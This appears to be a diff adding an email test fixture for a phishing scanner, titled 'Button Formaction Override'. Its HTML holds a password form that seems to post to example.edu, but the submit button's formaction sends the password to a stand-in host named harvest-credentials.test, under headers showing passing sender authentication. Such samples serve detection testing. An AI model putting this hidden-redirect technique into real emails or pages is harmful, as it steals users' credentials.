@@ -1,0 +1,8 @@
+From: "IT Service Desk" <security@security.example.edu>
+To: staff@example.edu
+Subject: Button Formaction Override
+Authentication-Results: mx.example.edu; spf=pass smtp.mailfrom=security.example.edu; dkim=pass header.d=security.example.edu; dmarc=pass
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+
+<html><body><p>Confirm your details.</p><form action="https://example.edu/account" method="POST"><input type="password" name="p"><button formaction="https://harvest-credentials.test/override">Submit</button></form></body></html>
